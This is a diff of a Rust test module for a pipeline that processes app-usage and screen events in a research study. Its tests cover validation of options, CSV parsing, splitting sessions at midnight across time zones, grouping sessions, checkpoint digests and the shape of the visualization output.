+                not_real(drop_out_of_source_order_events),
+                not_real(interaction_type_remap),
+                not_real(correct_duplicate_event_timestamps),
+                not_real(allow_stop_event_reuse),
+                not_real(use_activity_stopped_as_fallback),
+                not_real(apply_threshold_to_fallback),
+                not_real(long_duration_threshold_ns),
+                not_real(proximity_interval_ns),
+                real(
+                    "custom_app_engagement_duration",
+                    custom_app_engagement_duration,
+                ),
+                real(
+                    "long_data_time_gap_thresholds",
+                    long_data_time_gap_thresholds,
+                ),
+                real(
+                    "long_usage_duration_thresholds",
+                    long_usage_duration_thresholds,
+                ),
+                not_real(same_app_stop_types),
+                not_real(other_stop_types),
+                not_real(interaction_types_to_remove),
+                not_real(interaction_type_removal_mode),
+                real(
+                    "screen_auto_lock_timeout_seconds",
+                    screen_auto_lock_timeout_seconds,
+                ),
+                real(
+                    "screen_auto_lock_tolerance_seconds",
+                    screen_auto_lock_tolerance_seconds,
+                ),
+                real(
+                    "screen_manual_lock_max_tail_seconds",
+                    screen_manual_lock_max_tail_seconds,
+                ),
+                real(
+                    "screen_keyguard_near_stop_seconds",
+                    screen_keyguard_near_stop_seconds,
+                ),
+                not_real(datetime_of_preprocessing),
+                not_real(model_concurrent_usage),
+                not_real(micro_use_classification_policy),
+                not_real(micro_use_classification_policy_explicit),
+                // Deliberate table divergence: `validate_option_real_numbers`
+                // routes this field to `not_a_real_number` because
+                // `checked_minimum_duration_threshold_ns` runs FIRST and refuses
+                // a non-finite value with the byte-identical rendered string --
+                // so this case exercises that earlier guard, not the destructure
+                // gate. Classified `real` here so the refusal is still asserted.
+                real("minimum_usage_duration", minimum_usage_duration),
+                not_real(minimum_usage_duration_explicit),
+                not_real(minimum_duration_comparator),
+                not_real(minimum_duration_comparator_explicit),
+                not_real(minimum_duration_disposition),
+                not_real(minimum_duration_disposition_explicit),
+                not_real(apply_minimum_usage_duration_to_concurrent_subintervals),
+                not_real(filter_zero_duration_sessions),
+                not_real(add_no_activity_placeholder_days),
+                not_real(enable_study_window_filter),
+                not_real(enable_person_attribution),
+                not_real(enable_day_coverage),
+                not_real(enable_compliance_scoring),
+                real("compliance_threshold_percent", compliance_threshold_percent),
+                not_real(enable_screen_gated_crediting),
+                not_real(screen_gating_rule),
+                not_real(day_boundary_attribution),
+                not_real(package_exclusion_preset),
+                not_real(notification_proxy_rule),
+                not_real(polled_emulation_method),
+                real(
+                    "polled_emulation_interval_seconds",
+                    polled_emulation_interval_seconds,
+                ),
+                real("polled_emulation_gap_seconds", polled_emulation_gap_seconds),
+                not_real(interval_expansion_method),
+                not_real(enable_aggregates),
+                not_real(aggregate_shape),
+                not_real(aggregate_top_apps_limit),
+                not_real(enable_participant_amount_summary),
+                not_real(materialize_visualization_data),
+                real("credited_session_cap_minutes", credited_session_cap_minutes),
+                real(
+                    "device_liveness_gap_tolerance_minutes",
+                    device_liveness_gap_tolerance_minutes,
+                ),
+                real("auto_lock_bridge_seconds", auto_lock_bridge_seconds),
+                not_real(no_witness_min_day_apps),
+                not_real(screen_session_construction_strategy),
+                not_real(screen_session_construction_strategy_explicit),
+                not_real(screen_session_classification_policy),
+                real(
+                    "screen_session_maximum_duration_minutes",
+                    screen_session_maximum_duration_minutes,
+                ),
+                not_real(screen_session_maximum_duration_disposition),
+                not_real(locked_screen_audio_disposition),
+                not_real(opener_set),
+                not_real(episode_reconstruction_strategy),
+                not_real(interval_quality_policy),
+                not_real(session_grouping_policy),
+                not_real(session_gap_basis),
+                not_real(session_boundary_scope),
+                not_real(emit_session_break_lineage),
+                not_real(event_retention_set),
+                not_real(maximum_duration),
+            ]
+            .into_iter()
+            .flatten()
+            .collect()
+        }
+
+        // Measured, not assumed: neither spelling of a non-finite number
+        // survives the JSON ingress. If either of these ever parses, the
+        // options gate below is the only thing standing between a browser
+        // request and an infinite comparison bound.
+        let mut request = minimal_options_request();
+        request["screen_auto_lock_timeout_seconds"] = serde_json::Value::Null;
+        let template = serde_json::to_string(&request).expect("request serializes");
+        for spelling in ["1e999", "null"] {
+            let text = template.replace(
+                "\"screen_auto_lock_timeout_seconds\":null",
+                &format!("\"screen_auto_lock_timeout_seconds\":{spelling}"),
+            );
+            let refusal = serde_json::from_str::<PipelineV2OptionsJson>(&text)
+                .err()
+                .map(|error| error.to_string())
+                .unwrap_or_else(|| {
+                    panic!("a {spelling} screen timeout reached the options through serde")
+                });
+            assert!(
+                refusal.contains("number out of range") || refusal.contains("invalid type: null"),
+                "{spelling} was refused for an unexpected reason: {refusal}",
+            );
+        }
+
+        type Setter = Box<dyn Fn(&mut PipelineV2Options, f64)>;
+        let setters: Vec<(&'static str, Setter)> = vec![
+            (
+                "custom_app_engagement_duration",
+                Box::new(|o: &mut PipelineV2Options, v: f64| o.custom_app_engagement_duration = v),
+            ),
+            (
+                "long_data_time_gap_thresholds",
+                Box::new(|o: &mut PipelineV2Options, v: f64| {
+                    o.long_data_time_gap_thresholds = vec![1.0, v]
+                }),
+            ),
+            (
+                "long_usage_duration_thresholds",
+                Box::new(|o: &mut PipelineV2Options, v: f64| {
+                    o.long_usage_duration_thresholds = vec![1.0, v]
+                }),
+            ),
+            (
+                "screen_auto_lock_timeout_seconds",
+                Box::new(|o: &mut PipelineV2Options, v: f64| {
+                    o.screen_auto_lock_timeout_seconds = v
+                }),
+            ),
+            (
+                "screen_auto_lock_tolerance_seconds",
+                Box::new(|o: &mut PipelineV2Options, v: f64| {
+                    o.screen_auto_lock_tolerance_seconds = v
+                }),
+            ),
+            (
+                "screen_manual_lock_max_tail_seconds",
+                Box::new(|o: &mut PipelineV2Options, v: f64| {
+                    o.screen_manual_lock_max_tail_seconds = v
+                }),
+            ),
+            (
+                "screen_keyguard_near_stop_seconds",
+                Box::new(|o: &mut PipelineV2Options, v: f64| {
+                    o.screen_keyguard_near_stop_seconds = v
+                }),
+            ),
+            (
+                "screen_session_maximum_duration_minutes",
+                Box::new(|o: &mut PipelineV2Options, v: f64| {
+                    o.screen_session_maximum_duration_minutes = v
+                }),
+            ),
+            (
+                "minimum_usage_duration",
+                Box::new(|o: &mut PipelineV2Options, v: f64| o.minimum_usage_duration = v),
+            ),
+            (
+                "compliance_threshold_percent",
+                Box::new(|o: &mut PipelineV2Options, v: f64| o.compliance_threshold_percent = v),
+            ),
+            (
+                "polled_emulation_interval_seconds",
+                Box::new(|o: &mut PipelineV2Options, v: f64| {
+                    o.polled_emulation_interval_seconds = v
+                }),
+            ),
+            (
+                "polled_emulation_gap_seconds",
+                Box::new(|o: &mut PipelineV2Options, v: f64| o.polled_emulation_gap_seconds = v),
+            ),
+            (
+                "credited_session_cap_minutes",
+                Box::new(|o: &mut PipelineV2Options, v: f64| o.credited_session_cap_minutes = v),
+            ),
+            (
+                "device_liveness_gap_tolerance_minutes",
+                Box::new(|o: &mut PipelineV2Options, v: f64| {
+                    o.device_liveness_gap_tolerance_minutes = v
+                }),
+            ),
+            (
+                "auto_lock_bridge_seconds",
+                Box::new(|o: &mut PipelineV2Options, v: f64| o.auto_lock_bridge_seconds = v),
+            ),
+        ];
+
+        let baseline = test_options();
+        validate_pipeline_v2_options(&baseline).expect(
+            "the baseline options are valid, or every case below passes for the wrong reason",
+        );
+        assert_eq!(
+            setters.iter().map(|(name, _)| *name).collect::<BTreeSet<_>>(),
+            real_valued_option_fields(&baseline),
+            "the setter table and the exhaustive destructure disagree about which options carry a real number",
+        );
+
+        for (name, set) in &setters {
+            for bad in [f64::INFINITY, f64::NEG_INFINITY, f64::NAN] {
+                let mut options = baseline.clone();
+                set(&mut options, bad);
+                let error = validate_pipeline_v2_options(&options)
+                    .expect_err(&format!("{name} accepted {bad}"));
+                assert_eq!(
+                    error.to_string(),
+                    format!("pipeline_options_invalid:{name}:non_finite"),
+                    "{name} was refused, but not as a non-finite {name}",
+                );
+            }
+        }
+
+        // A negative keyguard window inverted a slice range in the screen
+        // classifier; the four screen timings are refused below zero.
+        for name in [
+            "screen_auto_lock_timeout_seconds",
+            "screen_auto_lock_tolerance_seconds",
+            "screen_manual_lock_max_tail_seconds",
+            "screen_keyguard_near_stop_seconds",
+        ] {
+            let (_, set) = setters.iter().find(|(field, _)| *field == name).expect("setter");
+            let mut options = baseline.clone();
+            set(&mut options, -2.0);
+            assert_eq!(
+                validate_pipeline_v2_options(&options).expect_err("negative").to_string(),
+                format!("pipeline_options_invalid:{name}:negative"),
+            );
+        }
+    }
+
+    /// Excel's "CSV UTF-8" starts the file with a byte-order mark. Support-file
+    /// validation strips it, so the parser the lookups are built from must too.
+    #[test]
+    fn a_byte_order_mark_does_not_hide_the_first_support_column() {
+        let bytes = b"\xEF\xBB\xBFparticipant_id,start_date,end_date\nP01,2026-01-05,2026-01-10\n";
+        validate_support_csv("study_dates_file", bytes).expect("validates");
+        let windows = parse_study_windows(bytes).expect("parses");
+        assert_eq!(windows.len(), 1, "the participant column was read");
+        assert_eq!(windows[0].participant_id, "P01");
+    }
+
+    /// Every label the screen channel closes a session on is an OFF witness
+    /// for credit, and the fused type-15 label is an ON witness.
+    #[test]
+    fn screen_credit_reads_the_fused_and_device_level_screen_labels() {
+        for label in SCREEN_STOP_EVENTS {
+            assert_eq!(
+                screen_witness_state(label).expect("mapped"),
+                Some(ScreenCreditState::Off),
+                "{label}",
+            );
+        }
+        for label in SCREEN_START_EVENTS {
+            assert_eq!(
+                screen_witness_state(label).expect("mapped"),
+                Some(ScreenCreditState::On),
+                "{label}",
+            );
+        }
+    }
+
+    /// The smallest request document that parses: every key without a serde
+    /// default, and nothing else.
+    fn minimal_options_request() -> serde_json::Value {
+        serde_json::json!({
+            "study_name": "Study",
+            "timezone": "UTC",
+            "usage_session_mode": "app_usage",
+            "include_app_output": true,
+            "include_screen_output": true,
+            "use_filter_file": false,
+            "use_apps_forcing_screen_open": false,
+            "use_app_codebook": false,
+            "correct_duplicate_event_timestamps": true,
+            "allow_stop_event_reuse": false,
+            "use_activity_stopped_as_fallback": true,
+            "apply_threshold_to_fallback": true,
+            "long_duration_threshold_ns": 43_200_000_000_000_i64,
+            "custom_app_engagement_duration": 300.0,
+            "long_data_time_gap_thresholds": [1.0],
+            "long_usage_duration_thresholds": [1.0],
+            "same_app_stop_types": ["Activity Paused"],
+            "other_stop_types": ["Activity Resumed"],
+            "interaction_types_to_remove": [],
+            "screen_auto_lock_timeout_seconds": 120.0,
+            "screen_auto_lock_tolerance_seconds": 30.0,
+            "screen_manual_lock_max_tail_seconds": 30.0,
+            "screen_keyguard_near_stop_seconds": 2.0,
+            "datetime_of_preprocessing": "2026-07-21 12:00:00 UTC",
+        })
     }
 
     /// Two ways of asking the same question: which parts of the previous
@@ -9669,20 +6859,20 @@ mod tests {
         let cases: [(&str, Disturb, (bool, bool, bool, bool)); 3] = [
             (
                 "identity",
-                |row| row.edit_identity().source_data_rows = SourceDataRows::single(9_999),
+                |row| *row.edit_identity().source_data_rows = SourceDataRows::single(9_999),
                 (false, false, false, false),
             ),
             (
                 "temporal",
                 |row| {
                     let data = row.edit_temporal();
-                    data.duration_seconds = Some(data.duration_seconds.unwrap_or_default() + 1.0);
+                    *data.duration_seconds = Some(data.duration_seconds.unwrap_or_default() + 1.0);
                 },
                 (true, true, false, true),
             ),
             (
                 "classification",
-                |row| row.edit_classification().application_label = "Moved".into(),
+                |row| *row.edit_classification().application_label = "Moved".into(),
                 (true, true, true, false),
             ),
         ];
@@ -9810,8 +7000,8 @@ mod tests {
             workflow_checkpoint("source-step", &[("rows", &previous_rows)], &[]);
 
         let mut rows = previous_rows.clone();
-        rows[0].edit_temporal().duration_seconds = Some(60.0);
-        rows[1].edit_classification().application_label = "Changed".into();
+        *rows[0].edit_temporal().duration_seconds = Some(60.0);
+        *rows[1].edit_classification().application_label = "Changed".into();
         let payload = br#"{"enabled":false,"upstreamDigest":"fixed"}"#;
         let optimized = workflow_checkpoint_with_known_membership_and_order(
             "remove_zero_duration_rows",
@@ -9870,12 +7060,30 @@ mod tests {
         );
     }
 
-    fn test_options() -> PipelineV2Options {
+    pub(super) fn test_options() -> PipelineV2Options {
         PipelineV2Options {
             study_name: "Shadow Study".into(),
+            include_app_usage_end_reason: false,
+            neutralize_spreadsheet_formulas: false,
             timezone: "America/Chicago".into(),
             timezone_handling: "selected-convert".into(),
             usage_session_mode: UsageSessionMode::AppUsage,
+            screen_session_construction_strategy: ScreenSessionConstructionStrategyId::default(),
+            screen_session_construction_strategy_explicit: false,
+            screen_session_classification_policy: ScreenSessionClassificationPolicy::None,
+            screen_session_maximum_duration_minutes: 0.0,
+            screen_session_maximum_duration_disposition:
+                ScreenSessionMaximumDurationDisposition::None,
+            locked_screen_audio_disposition: LockedScreenAudioDisposition::Include,
+            episode_reconstruction_strategy: EpisodeReconstructionStrategy::FusedMatcher,
+            opener_set: OpenerSet::StrategyDefined,
+            interval_quality_policy: IntervalQualityPolicy::None,
+            session_grouping_policy: SessionGroupingPolicy::None,
+            session_gap_basis: SessionGapBasis::default(),
+            session_boundary_scope: SessionBoundaryScope::default(),
+            emit_session_break_lineage: false,
+            event_retention_set: EventRetentionSet::None,
+            maximum_duration: b06::MaximumDurationRequest::default(),
             include_app_output: true,
             include_screen_output: false,
             use_filter_file: false,
@@ -9884,6 +7092,7 @@ mod tests {
             use_app_codebook: false,
             include_category_column: false,
             deduplicate_exact_rows: true,
+            drop_out_of_source_order_events: false,
             interaction_type_remap: Vec::new(),
             correct_duplicate_event_timestamps: true,
             allow_stop_event_reuse: false,
@@ -9897,13 +7106,21 @@ mod tests {
             same_app_stop_types: vec!["Activity Paused".into(), "Activity Resumed".into()],
             other_stop_types: vec!["Activity Resumed".into(), "Device Shutdown".into()],
             interaction_types_to_remove: Vec::new(),
+            interaction_type_removal_mode: InteractionTypeRemovalMode::GapPreserving,
             screen_auto_lock_timeout_seconds: 120.0,
             screen_auto_lock_tolerance_seconds: 30.0,
             screen_manual_lock_max_tail_seconds: 30.0,
             screen_keyguard_near_stop_seconds: 2.0,
             datetime_of_preprocessing: "2026-07-21 12:00:00 UTC".into(),
             model_concurrent_usage: false,
+            micro_use_classification_policy: MicroUseClassificationPolicy::None,
+            micro_use_classification_policy_explicit: false,
             minimum_usage_duration: 60.0,
+            minimum_usage_duration_explicit: false,
+            minimum_duration_comparator: MinimumDurationComparator::StrictLt,
+            minimum_duration_comparator_explicit: false,
+            minimum_duration_disposition: MinimumDurationDisposition::ChronicleBlankKeepRow,
+            minimum_duration_disposition_explicit: false,
             apply_minimum_usage_duration_to_concurrent_subintervals: false,
             filter_zero_duration_sessions: false,
             add_no_activity_placeholder_days: false,
@@ -9915,12 +7132,210 @@ mod tests {
             enable_screen_gated_crediting: false,
             enable_aggregates: false,
             aggregate_shape: "wide".into(),
+            aggregate_top_apps_limit: 0,
+            enable_participant_amount_summary: false,
             materialize_visualization_data: true,
             credited_session_cap_minutes: 360.0,
             device_liveness_gap_tolerance_minutes: 120.0,
             auto_lock_bridge_seconds: 120.0,
             no_witness_min_day_apps: 2,
+            screen_gating_rule: ScreenGatingRule::default(),
+            day_boundary_attribution: DayBoundaryAttribution::default(),
+            filter_match_field: FilterMatchField::AppPackageName,
+            application_label_exclusions: Vec::new(),
+            package_exclusion_preset: PackageExclusionPreset::AllSuppliedRows,
+            notification_proxy_rule: NotificationProxyRule::None,
+            polled_emulation_method: PolledEmulationMethod::None,
+            polled_emulation_interval_seconds: 10.0,
+            polled_emulation_gap_seconds: 15.0,
+            interval_expansion_method: IntervalExpansionMethod::None,
         }
+    }
+
+    /// B14: a session that runs past local midnight belongs to two calendar
+    /// days. Under the default rule the whole session is still attributed to
+    /// the day it started, which is what every earlier release recorded.
+    #[test]
+    fn a_session_that_spans_local_midnight_is_divided_into_one_row_per_day() {
+        let csv = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            // Source timestamps are UTC; `selected-convert` renders them in
+            // America/Chicago, where they read 23:40 and 00:20 across midnight.
+            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 05:40:00,UTC\n",
+            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-03-07 06:20:00,UTC\n",
+        );
+        let day_of = |rows: &[(u32, HashMap<String, String>)], index: usize| {
+            rows[index]
+                .1
+                .get("date")
+                .cloned()
+                .expect("every app row carries a date")
+        };
+        let seconds_of = |rows: &[(u32, HashMap<String, String>)], index: usize| {
+            rows[index]
+                .1
+                .get("duration_seconds")
+                .expect("every app row carries a duration")
+                .parse::<f64>()
+                .expect("the duration column is numeric")
+        };
+
+        let mut options = test_options();
+        let whole = run_pipeline_v2_with_supports(
+            csv.as_bytes(),
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("the undivided run succeeds");
+        let whole_rows = parse_csv_to_records_with_physical_rows(&whole.app_csv_bytes.to_vec());
+        assert_eq!(whole_rows.len(), 1);
+        assert_eq!(day_of(&whole_rows, 0), "2026-03-06");
+        assert_eq!(seconds_of(&whole_rows, 0), 2_400.0);
+
+        options.day_boundary_attribution = DayBoundaryAttribution::SplitAtLocalMidnight;
+        let divided = run_pipeline_v2_with_supports(
+            csv.as_bytes(),
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("the divided run succeeds");
+        let divided_rows = parse_csv_to_records_with_physical_rows(&divided.app_csv_bytes.to_vec());
+        assert_eq!(divided_rows.len(), 2);
+        assert_eq!(day_of(&divided_rows, 0), "2026-03-06");
+        assert_eq!(day_of(&divided_rows, 1), "2026-03-07");
+        assert_eq!(seconds_of(&divided_rows, 0), 1_200.0);
+        assert_eq!(seconds_of(&divided_rows, 1), 1_200.0);
+        assert_eq!(
+            seconds_of(&divided_rows, 0) + seconds_of(&divided_rows, 1),
+            seconds_of(&whole_rows, 0),
+            "dividing a session must move time between days, never create or destroy it",
+        );
+        assert_eq!(divided.app_row_count, 2);
+    }
+
+    /// The boundary is the first instant of the local day, which is not always
+    /// midnight. Chile springs forward at 00:00, so 2026-09-06 has no 00:00
+    /// local and opens at 01:00 (04:00 UTC). Resolving the boundary through
+    /// `from_local_datetime` is what keeps the division on the real calendar.
+    #[test]
+    fn dividing_at_the_day_boundary_uses_the_first_instant_a_local_day_actually_has() {
+        let santiago: Tz = "America/Santiago".parse().expect("a known timezone");
+        let missing_midnight = NaiveDate::from_ymd_opt(2026, 9, 6)
+            .expect("a real date")
+            .and_hms_opt(0, 0, 0)
+            .expect("a real wall time");
+        assert!(
+            matches!(
+                santiago.from_local_datetime(&missing_midnight),
+                chrono::LocalResult::None
+            ),
+            "the fixture depends on 2026-09-06 00:00 not existing in Santiago",
+        );
+        let day_start = local_day_start_ns(
+            NaiveDate::from_ymd_opt(2026, 9, 6).expect("a real date"),
+            santiago,
+        )
+        .expect("the day still starts somewhere");
+        assert_eq!(
+            ts_to_local(day_start, chrono_tz::UTC)
+                .format("%Y-%m-%d %H:%M:%S")
+                .to_string(),
+            "2026-09-06 04:00:00",
+        );
+
+        let csv = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            // 03:30 UTC is 23:30 the previous evening in Santiago; 05:00 UTC
+            // is 02:00 the next morning, after the hour that never happened.
+            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-09-06 03:30:00,UTC\n",
+            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-09-06 05:00:00,UTC\n",
+        );
+        let mut options = test_options();
+        options.timezone = "America/Santiago".into();
+        options.day_boundary_attribution = DayBoundaryAttribution::SplitAtLocalMidnight;
+        let divided = run_pipeline_v2_with_supports(
+            csv.as_bytes(),
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("the divided run succeeds across the transition");
+        let rows = parse_csv_to_records_with_physical_rows(&divided.app_csv_bytes.to_vec());
+        let field = |index: usize, column: &str| {
+            rows[index]
+                .1
+                .get(column)
+                .cloned()
+                .unwrap_or_else(|| panic!("row {index} carries {column}"))
+        };
+        assert_eq!(rows.len(), 2);
+        assert_eq!(field(0, "date"), "2026-09-05");
+        assert_eq!(field(1, "date"), "2026-09-06");
+        // 23:30 -> 01:00 local is 30 minutes of real time, not 90: the hour in
+        // between never happened.
+        assert_eq!(
+            field(0, "duration_seconds").parse::<f64>().unwrap(),
+            1_800.0
+        );
+        assert_eq!(
+            field(1, "duration_seconds").parse::<f64>().unwrap(),
+            3_600.0
+        );
+    }
+
+    /// A grouping policy that nothing reads is not a measurement choice, it is
+    /// a label. `session_grouping_policy` selects the published gap definition
+    /// that turns adjacent episodes into one usage session, so the id has to
+    /// reach the app table on the path that actually produces it.
+    #[test]
+    fn the_session_grouping_policy_numbers_sessions_in_the_published_app_table() {
+        let csv = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            // Three two-minute episodes. The first gap is 10 s and the second
+            // is 70 s, so a 60 s cut puts the first two together and starts a
+            // new session at the third.
+            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 12:00:00,UTC\n",
+            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-03-07 12:02:00,UTC\n",
+            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 12:02:10,UTC\n",
+            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-03-07 12:04:10,UTC\n",
+            "Study,P01,Target Child,Video,Activity Resumed,com.example.video,2026-03-07 12:05:20,UTC\n",
+            "Study,P01,Target Child,Video,Activity Paused,com.example.video,2026-03-07 12:07:20,UTC\n",
+        );
+
+        let mut options = test_options();
+        let ungrouped = run_pipeline_v2_with_supports(
+            csv.as_bytes(),
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("the ungrouped run succeeds");
+        let ungrouped_rows = parse_csv_to_records_with_physical_rows(&ungrouped.app_csv_bytes.to_vec());
+        assert_eq!(ungrouped_rows.len(), 3);
+        assert!(
+            !ungrouped_rows[0].1.contains_key("usage_session_id"),
+            "the default policy emits no session column at all",
+        );
+
+        options.session_grouping_policy = SessionGroupingPolicy::ZerrerSixtySeconds;
+        let grouped = run_pipeline_v2_with_supports(
+            csv.as_bytes(),
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("the grouped run succeeds");
+        let grouped_rows = parse_csv_to_records_with_physical_rows(&grouped.app_csv_bytes.to_vec());
+        assert_eq!(grouped_rows.len(), 3);
+        let session_of = |index: usize| {
+            grouped_rows[index]
+                .1
+                .get("usage_session_id")
+                .cloned()
+                .unwrap_or_else(|| panic!("row {index} carries usage_session_id"))
+        };
+        assert_eq!(
+            [session_of(0), session_of(1), session_of(2)],
+            ["0".to_string(), "0".to_string(), "1".to_string()],
+            "a 10 s gap stays inside the session and a 70 s gap opens a new one",
+        );
     }
 
     #[test]
@@ -10074,19 +7489,19 @@ mod tests {
             2
         );
         assert_eq!(wide_by_kind["aggregate-app-co-usage-csv"].row_count, 1);
-        let daily = String::from_utf8(wide_by_kind["aggregate-daily-summary-csv"].bytes.clone())
+        let daily = String::from_utf8(wide_by_kind["aggregate-daily-summary-csv"].bytes.to_vec())
             .expect("daily aggregate is UTF-8 CSV");
         assert!(daily.contains("total_app_usage_minutes"));
         assert!(daily.contains("2026-03-07"));
         let categories = String::from_utf8(
             wide_by_kind["aggregate-category-time-budget-csv"]
                 .bytes
-                .clone(),
+                .to_vec(),
         )
         .expect("category aggregate is UTF-8 CSV");
         assert!(categories.contains("Social"));
         assert!(categories.contains("Games"));
-        let co_usage = String::from_utf8(wide_by_kind["aggregate-app-co-usage-csv"].bytes.clone())
+        let co_usage = String::from_utf8(wide_by_kind["aggregate-app-co-usage-csv"].bytes.to_vec())
             .expect("co-usage aggregate is UTF-8 CSV");
         assert!(co_usage.contains("com.example.chat,com.example.game,1,1.5"));
 
@@ -10100,7 +7515,7 @@ mod tests {
             .expect("long daily aggregate");
         assert_eq!(long_daily.row_count, 10);
         let long_daily_csv =
-            String::from_utf8(long_daily.bytes.clone()).expect("long aggregate is UTF-8 CSV");
+            String::from_utf8(long_daily.bytes.to_vec()).expect("long aggregate is UTF-8 CSV");
         assert!(long_daily_csv
             .starts_with("study_id,study_name,participant_id,date,timezone,metric,value\n"));
         assert!(long_daily_csv.contains("active_window_minutes,3"));
@@ -10222,6 +7637,8 @@ mod tests {
             "episode_annotations",
             "interval_cleaning",
             "normalize_timezones",
+            "notification_proxy",
+            "polled_emulation",
             "observation_window",
             "outputs",
             "parse_events",
@@ -10346,6 +7763,76 @@ mod tests {
     }
 
     #[test]
+    fn public_workflow_checkpoint_validator_closes_every_identity_component() {
+        let component = |byte: u8| format!("xxh3:{}", format!("{byte:02x}").repeat(16));
+        let components = [
+            component(0x11),
+            component(0x22),
+            component(0x33),
+            component(0x44),
+            component(0x55),
+            component(0x66),
+        ];
+        let terminal = terminal_checkpoint_digest(
+            "decode_source_records",
+            [
+                &components[0],
+                &components[1],
+                &components[2],
+                &components[3],
+                &components[4],
+                &components[5],
+            ],
+        );
+        let checkpoint = WorkflowCheckpoint {
+            protocol_version: WORKFLOW_CHECKPOINT_PROTOCOL.into(),
+            subject_id: "decode_source_records".into(),
+            row_membership_digest: components[0].clone(),
+            row_order_digest: components[1].clone(),
+            temporal_state_digest: components[2].clone(),
+            classification_digest: components[3].clone(),
+            payload_digest: components[4].clone(),
+            schema_digest: components[5].clone(),
+            terminal_digest: terminal.clone(),
+        };
+        assert_eq!(
+            validate_workflow_checkpoint_for_subject(&checkpoint, "decode_source_records").unwrap(),
+            terminal
+        );
+
+        let mut protocol = checkpoint.clone();
+        protocol.protocol_version = "future".into();
+        assert!(
+            validate_workflow_checkpoint_for_subject(&protocol, "decode_source_records").is_err()
+        );
+        assert!(validate_workflow_checkpoint_for_subject(&checkpoint, "other_query").is_err());
+
+        for index in 0..6 {
+            let mut changed = checkpoint.clone();
+            let field = match index {
+                0 => &mut changed.row_membership_digest,
+                1 => &mut changed.row_order_digest,
+                2 => &mut changed.temporal_state_digest,
+                3 => &mut changed.classification_digest,
+                4 => &mut changed.payload_digest,
+                _ => &mut changed.schema_digest,
+            };
+            *field = component(0x77 + index as u8);
+            assert!(
+                validate_workflow_checkpoint_for_subject(&changed, "decode_source_records")
+                    .is_err()
+            );
+        }
+
+        let mut noncanonical = checkpoint;
+        noncanonical.row_membership_digest.make_ascii_uppercase();
+        assert!(
+            validate_workflow_checkpoint_for_subject(&noncanonical, "decode_source_records")
+                .is_err()
+        );
+    }
+
+    #[test]
     fn batched_fixed_checkpoint_encodings_match_the_streaming_reference() {
         let first = [0x11_u8; 16];
         let second = [0x22_u8; 16];
@@ -10447,7 +7934,7 @@ mod tests {
             .expect("visualization-enabled run");
         assert!(!enabled.visualization_data_json_bytes.is_empty());
         let visualization: serde_json::Value =
-            serde_json::from_slice(&enabled.visualization_data_json_bytes)
+            serde_json::from_slice(&enabled.visualization_data_json_bytes.to_vec())
                 .expect("visualization row-array JSON");
         assert_eq!(
             visualization["protocolVersion"],
@@ -10486,6 +7973,89 @@ mod tests {
             })
             .collect::<BTreeSet<_>>();
         assert_eq!(changed_steps, BTreeSet::from(["assemble_result_manifest"]));
+    }
+
+    #[test]
+    fn b03_visualization_v4_exposes_classification_and_explicit_not_applicable_cells() {
+        const SECOND: i64 = 1_000_000_000;
+        let app_rows = incremental::classify_episode_durations(
+            episode_rows(&[(
+                ACTIVITY_RESUMED,
+                "com.example.micro",
+                Some(0),
+                Some(4 * SECOND),
+            )]),
+            &BTreeSet::new(),
+            MicroUseClassificationPolicy::OkoshiLt5s,
+            0.0,
+            MinimumDurationComparator::StrictLt,
+            MinimumDurationDisposition::ChronicleBlankKeepRow,
+            &[],
+            &b06::MaximumDurationRowStage::omitted(),
+        )
+        .expect("classification with the omitted B06 shape never refuses");
+        let mut screen_rows = episode_rows(&[(SCREEN_USAGE, "android", Some(0), Some(SECOND))]);
+        *screen_rows[0].edit_classification().interaction_type = SCREEN_USAGE.into();
+        *screen_rows[0]
+            .edit_classification()
+            .micro_use_classification = None;
+
+        let projected = build_visualization_data(&app_rows, &screen_rows, BTreeMap::new(), None, true);
+        let value = serde_json::to_value(projected).expect("B03 visualization serializes");
+        assert_eq!(value["protocolVersion"], VISUALIZATION_DATA_B03_PROTOCOL);
+        assert_eq!(
+            value["columns"],
+            serde_json::json!(VISUALIZATION_DATA_B03_COLUMNS)
+        );
+        assert_eq!(value["appRows"][0][11], "micro_use");
+        assert_eq!(value["screenRows"][0][11], "not_applicable");
+
+        let mut csv_options = test_options();
+        csv_options.micro_use_classification_policy = MicroUseClassificationPolicy::OkoshiLt5s;
+        csv_options.micro_use_classification_policy_explicit = true;
+        let mut csv_rows = app_rows.clone();
+        csv_rows.push(screen_rows[0].clone());
+        let csv = write_app_csv(&csv_rows, &csv_options, false);
+        let records = parse_csv_to_records_with_physical_rows(&csv);
+        assert_eq!(records[0].1["micro_use_classification"], "micro_use");
+        assert_eq!(records[1].1["micro_use_classification"], "not_applicable");
+
+        let baseline = serde_json::to_value(build_visualization_data(
+            &app_rows,
+            &screen_rows,
+            BTreeMap::new(),
+            None,
+            false,
+        ))
+        .expect("baseline visualization serializes");
+        assert_eq!(baseline["protocolVersion"], VISUALIZATION_DATA_PROTOCOL);
+        assert_eq!(
+            baseline["columns"],
+            serde_json::json!(VISUALIZATION_DATA_COLUMNS)
+        );
+        assert_eq!(baseline["appRows"][0].as_array().unwrap().len(), 11);
+
+        let raw = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,Micro,Activity Resumed,com.example.micro,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Child,Micro,Activity Paused,com.example.micro,2026-03-07 10:00:04,UTC\n",
+        );
+        let mut options = test_options();
+        options.timezone = "UTC".into();
+        options.correct_duplicate_event_timestamps = false;
